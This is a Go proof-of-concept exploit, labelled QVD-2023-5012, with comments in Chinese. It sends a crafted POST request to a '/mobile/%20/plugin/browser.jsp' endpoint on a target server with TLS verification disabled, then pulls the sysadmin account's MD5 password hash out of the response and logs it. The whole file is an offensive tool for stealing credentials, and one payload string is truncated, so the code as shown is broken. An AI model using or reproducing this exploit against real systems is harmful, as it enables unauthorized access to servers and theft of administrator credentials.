package poc

import (
	"crypto/tls"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func QVD_2023_5012(targetURL string) string {
	PocUrl := targetURL + "/mobile/%20/plugin/browser.jsp"
	PocData := "isDis=1&browserTypeId=269&keyword
	data := strings.NewReader(PocData)
	req, err := http.NewRequest("POST", PocUrl, data)
	if err != nil {
		log.Print(err)
		return "err"
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}

	// 获取结果
	reg := regexp.MustCompile("\"show1\":.([^\\\"]+)")
	version := reg.MatchString(string(body))
	regPasswd := regexp.MustCompile(`"show1":"(.*?)"`)
	PassWord := regPasswd.FindStringSubmatch(string(body))
	if resp.StatusCode == 200 && version {
		log.Print("[+] 存在QVD_2023_5012漏洞: ", targetURL)
		log.Print("[+] 获取 sysadmin MD5密码为：", strings.TrimRight(PassWord[1], "%"), " 请自行解密")
		return "[+] 存在QVD_2023_5012漏洞"
	} else {
		log.Print("[-] 不存在QVD_2023_5012漏洞")
		return "[-] 不存在QVD_2023_5012漏洞"
	}
}
